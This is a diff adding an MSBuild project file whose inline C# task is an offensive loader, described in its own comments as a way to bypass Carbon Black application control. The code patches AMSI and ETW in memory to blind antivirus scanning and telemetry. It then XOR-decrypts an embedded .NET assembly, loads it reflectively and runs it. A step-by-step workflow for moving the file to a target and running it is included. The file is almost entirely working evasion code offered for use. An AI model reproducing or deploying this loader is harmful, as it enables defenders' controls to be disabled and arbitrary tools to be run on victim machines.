@@ -1,0 +1,207 @@
+<!--
+  MSBuild Inline Task — Bypasses Carbon Black App Control
+
+  MSBuild.exe is Microsoft-signed and ships with .NET Framework.
+  Carbon Black whitelists it. This XML file is not subject to app control
+  because it's data, not an executable.
+
+  Workflow:
+    1. python encrypt_payload.py xor YourTool.exe --format cs
+    2. Paste the byte arrays into the PAYLOAD SECTION below
+    3. Set the args in the ARGUMENTS SECTION
+    4. Transfer this .csproj to target
+    5. Run:
+       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe msbuild_payload.csproj
+
+  The chain: MSBuild (whitelisted) → inline C# compile (in-memory) →
+  AMSI patch → ETW patch → Assembly.Load(decrypted bytes) → execute → cleanup
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Execute">
+    <InMemoryLoader />
+  </Target>
+  <UsingTask
+    TaskName="InMemoryLoader"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System" />
+      <Reference Include="System.Runtime.InteropServices" />
+      <Using Namespace="System" />
+      <Using Namespace="System.Reflection" />
+      <Using Namespace="System.Runtime.InteropServices" />
+      <Code Type="Class" Language="cs">
+<![CDATA[
+using System;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+
+public class InMemoryLoader : Task
+{
+    // P/Invoke declarations
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    static extern IntPtr LoadLibrary(string lpFileName);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
+        uint flNewProtect, out uint lpflOldProtect);
+
+    const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+    // ================================================================
+    //  AMSI Bypass — patch AmsiScanBuffer
+    // ================================================================
+    static bool PatchAmsi()
+    {
+        try
+        {
+            // amsi.dll may already be loaded by the MSBuild CLR
+            IntPtr hAmsi = LoadLibrary("amsi.dll");
+            if (hAmsi == IntPtr.Zero) return false;
+
+            IntPtr pScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+            if (pScanBuffer == IntPtr.Zero) return false;
+
+            // x64: mov eax, 0x80070057; ret → returns E_INVALIDARG
+            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+
+            uint oldProtect;
+            if (!VirtualProtect(pScanBuffer, (UIntPtr)patch.Length,
+                PAGE_EXECUTE_READWRITE, out oldProtect))
+                return false;
+
+            Marshal.Copy(patch, 0, pScanBuffer, patch.Length);
+
+            uint tmp;
+            VirtualProtect(pScanBuffer, (UIntPtr)patch.Length, oldProtect, out tmp);
+            return true;
+        }
+        catch { return false; }
+    }
+
+    // ================================================================
+    //  ETW Bypass — patch EtwEventWrite
+    // ================================================================
+    static bool PatchEtw()
+    {
+        try
+        {
+            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
+            if (hNtdll == IntPtr.Zero) return false;
+
+            IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
+            if (pEtwEventWrite == IntPtr.Zero) return false;
+
+            // x64: xor eax, eax; ret → returns STATUS_SUCCESS
+            byte[] patch = { 0x33, 0xC0, 0xC3 };
+
+            uint oldProtect;
+            if (!VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length,
+                PAGE_EXECUTE_READWRITE, out oldProtect))
+                return false;
+
+            Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
+
+            uint tmp;
+            VirtualProtect(pEtwEventWrite, (UIntPtr)patch.Length, oldProtect, out tmp);
+            return true;
+        }
+        catch { return false; }
+    }
+
+    // ================================================================
+    //  XOR decrypt
+    // ================================================================
+    static byte[] XorDecrypt(byte[] data, byte[] key)
+    {
+        byte[] result = new byte[data.Length];
+        for (int i = 0; i < data.Length; i++)
+            result[i] = (byte)(data[i] ^ key[i % key.Length]);
+        return result;
+    }
+
+    // ================================================================
+    //  PAYLOAD SECTION — paste from encrypt_payload.py
+    // ================================================================
+
+    // python encrypt_payload.py xor Seatbelt.exe --format cs
+    // Then paste the two arrays here:
+
+    static byte[] encryptedAssembly = new byte[] {
+        // PASTE ENCRYPTED ASSEMBLY BYTES HERE
+        0x00  // placeholder
+    };
+
+    static byte[] xorKey = new byte[] {
+        // PASTE XOR KEY HERE
+        0x00  // placeholder
+    };
+
+    // ================================================================
+    //  ARGUMENTS SECTION
+    // ================================================================
+
+    // Args passed to the loaded assembly's Main(string[])
+    static string[] assemblyArgs = new string[] {
+        // "-group=all",
+        // "-outputfile=C:\\Windows\\Temp\\out.txt",
+    };
+
+    // ================================================================
+    //  Execute
+    // ================================================================
+    public override bool Execute()
+    {
+        try
+        {
+            // 1. Patch ETW first (before any CLR telemetry about our actions)
+            PatchEtw();
+
+            // 2. Patch AMSI (before Assembly.Load scans our payload)
+            PatchAmsi();
+
+            // 3. Decrypt the assembly
+            byte[] clearAssembly = XorDecrypt(encryptedAssembly, xorKey);
+
+            // 4. Load and execute
+            Assembly asm = Assembly.Load(clearAssembly);
+            MethodInfo entry = asm.EntryPoint;
+
+            if (entry != null)
+            {
+                ParameterInfo[] parms = entry.GetParameters();
+                if (parms.Length == 0)
+                    entry.Invoke(null, null);
+                else
+                    entry.Invoke(null, new object[] { assemblyArgs });
+            }
+
+            // 5. Wipe decrypted bytes
+            Array.Clear(clearAssembly, 0, clearAssembly.Length);
+        }
+        catch (TargetInvocationException ex)
+        {
+            // The loaded assembly threw — print inner exception
+            Console.Error.WriteLine(ex.InnerException?.ToString());
+        }
+        catch (Exception ex)
+        {
+            Console.Error.WriteLine(ex.ToString());
+        }
+
+        return true;
+    }
+}
+]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
